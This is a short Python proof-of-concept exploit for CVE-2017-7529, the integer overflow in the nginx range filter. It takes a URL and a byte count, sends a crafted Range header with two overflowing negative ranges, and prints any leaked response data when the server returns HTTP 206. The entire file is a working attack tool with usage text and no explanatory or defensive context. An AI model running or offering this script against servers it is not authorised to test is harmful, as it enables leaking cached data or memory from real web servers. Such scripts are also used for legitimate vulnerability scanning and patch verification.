#!/usr/bin/python
# -*- coding:utf-8 -*-

import requests
import sys


def exploit(url, num_of_bytes):
    response = requests.get(url)
    content_length = response.headers.get('Content-Length', 0)
    bytes_length   = int(content_length) + num_of_bytes
    range_header = "bytes=-%d,-%d" % (bytes_length, 9223372036854775808 - bytes_length)
    response = requests.get(url, headers={'Range': range_header})
    if response.status_code == 206:
        print("[+] Vulnerable to CVE-2017-7529")
        print(response.text)
    else:
        print("[?] Unknown Vulnerable")


if __name__ == '__main__':
    if len(sys.argv) != 3:
        print("[*] %s <url> <num_of_bytes>" % sys.argv[0])
        sys.exit(1)

    url = sys.argv[1]
    num_of_bytes = int(sys.argv[2])
    exploit(url, num_of_bytes)